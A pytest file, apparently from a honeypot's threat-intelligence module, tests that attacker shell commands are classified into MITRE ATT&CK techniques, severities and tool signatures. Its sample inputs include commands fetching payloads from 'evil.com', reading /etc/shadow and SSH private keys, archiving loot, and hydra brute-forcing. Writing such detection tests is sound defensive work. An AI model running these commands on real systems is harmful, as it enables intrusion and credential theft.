"""
CI/CDecoy — CTI Enrichment Tests

Tests for the enrichment logic that classifies attacker commands
into MITRE ATT&CK techniques, assigns severity, and detects tools.
Imports from cti/enrichment.py — no DB or NATS required.
"""

import pytest

from enrichment import (
    classify_command,
    detect_kill_chain,
    MITRE_COMMAND_MAP,
    TOOL_SIGNATURES,
)


# ── Tests ───────────────────────────────────────────

class TestMITREClassification:

    def test_whoami(self):
        result = classify_command("whoami")
        assert any(t["technique_id"] == "T1033" for t in result["mitre_techniques"])

    def test_etc_shadow(self):
        result = classify_command("cat /etc/shadow")
        assert any(t["technique_id"] == "T1003.008" for t in result["mitre_techniques"])
        assert result["severity"] == "high"

    def test_uname(self):
        result = classify_command("uname -a")
        techs = result["mitre_techniques"]
        assert any(t["technique_id"] == "T1082" for t in techs)
        assert any(t["tactic"] == "discovery" for t in techs)

    def test_wget_tool_transfer(self):
        result = classify_command("wget http://evil.com/payload.sh")
        assert any(t["technique_id"] == "T1105" for t in result["mitre_techniques"])
        assert result["severity"] == "high"

    def test_ssh_lateral(self):
        result = classify_command("ssh root@10.0.0.5")
        techs = result["mitre_techniques"]
        assert any(t["technique_id"] == "T1021.004" for t in techs)
        assert any(t["tactic"] == "lateral-movement" for t in techs)

    def test_private_key_access(self):
        result = classify_command("cat /root/.ssh/id_rsa")
        assert any(t["technique_id"] == "T1552.004" for t in result["mitre_techniques"])

    def test_tar_archive(self):
        result = classify_command("tar czf /tmp/loot.tar.gz /etc")
        assert any(t["technique_id"] == "T1560.001" for t in result["mitre_techniques"])

    def test_crontab_persistence(self):
        result = classify_command("crontab -e")
        assert any(t["technique_id"] == "T1053.003" for t in result["mitre_techniques"])
        assert result["severity"] == "medium"

    def test_python_execution(self):
        result = classify_command("python3 -c 'import os; os.system(\"id\")'")
        assert any(t["technique_id"] == "T1059.006" for t in result["mitre_techniques"])

    def test_benign_command(self):
        result = classify_command("echo hello world")
        assert result["mitre_techniques"] == []
        assert result["severity"] == "info"

    def test_ls_root_home(self):
        result = classify_command("ls -la /root")
        assert any(t["technique_id"] == "T1083" for t in result["mitre_techniques"])

    def test_multi_technique_command(self):
        """A pipe chain can trigger multiple techniques."""
        result = classify_command("cat /etc/passwd | grep root")
        techs = result["mitre_techniques"]
        tech_ids = [t["technique_id"] for t in techs]
        assert "T1003.008" in tech_ids

    def test_no_duplicate_technique_ids(self):
        result = classify_command("whoami && id && whoami")
        tech_ids = [t["technique_id"] for t in result["mitre_techniques"]]
        assert len(tech_ids) == len(set(tech_ids))


class TestSeverityClassification:

    def test_discovery_is_low(self):
        result = classify_command("hostname")
        assert result["severity"] == "low"

    def test_credential_access_is_high(self):
        result = classify_command("cat /etc/shadow")
        assert result["severity"] == "high"

    def test_c2_is_high(self):
        result = classify_command("curl http://evil.com/shell.sh")
        assert result["severity"] == "high"

    def test_no_match_is_info(self):
        result = classify_command("clear")
        assert result["severity"] == "info"

    def test_highest_severity_wins(self):
        """If command matches both low and high, take high."""
        result = classify_command("cat /etc/shadow && hostname")
        assert result["severity"] == "high"


class TestToolDetection:

    def test_nmap_detected(self):
        result = classify_command("nmap -sV 10.0.0.0/24")
        assert "nmap" in result["tool_signatures"]

    def test_hydra_detected(self):
        result = classify_command("hydra -l admin -P passwords.txt ssh://target")
        assert "hydra" in result["tool_signatures"]

    def test_linpeas_detected(self):
        result = classify_command("./linpeas.sh")
        assert "linpeas" in result["tool_signatures"]

    def test_no_false_positive(self):
        result = classify_command("echo normal command")
        assert result["tool_signatures"] == []


class TestKillChainDetection:

    def test_single_phase_not_kill_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1033", "tactic": "discovery"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is False
        assert phases == ["discovery"]

    def test_two_phases_not_kill_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
        ]
        detected, _ = detect_kill_chain(techniques)
        assert detected is False

    def test_three_phases_is_kill_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
            {"technique_id": "T1021.004", "tactic": "lateral-movement"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is True
        assert len(phases) == 3

    def test_full_chain(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
            {"technique_id": "T1059.004", "tactic": "execution"},
            {"technique_id": "T1021.004", "tactic": "lateral-movement"},
            {"technique_id": "T1560.001", "tactic": "collection"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is True
        assert len(phases) == 5

    def test_deduplicates_phases(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T1033", "tactic": "discovery"},
            {"technique_id": "T1083", "tactic": "discovery"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
            {"technique_id": "T1105", "tactic": "command-and-control"},
        ]
        detected, phases = detect_kill_chain(techniques)
        assert detected is True
        assert phases.count("discovery") == 1

    def test_empty_techniques(self):
        detected, phases = detect_kill_chain([])
        assert detected is False
        assert phases == []

    def test_unknown_tactics_ignored(self):
        techniques = [
            {"technique_id": "T1082", "tactic": "discovery"},
            {"technique_id": "T9999", "tactic": "made-up-tactic"},
            {"technique_id": "T1003.008", "tactic": "credential-access"},
        ]
        detected, _ = detect_kill_chain(techniques)
        assert detected is False  # only 2 valid phases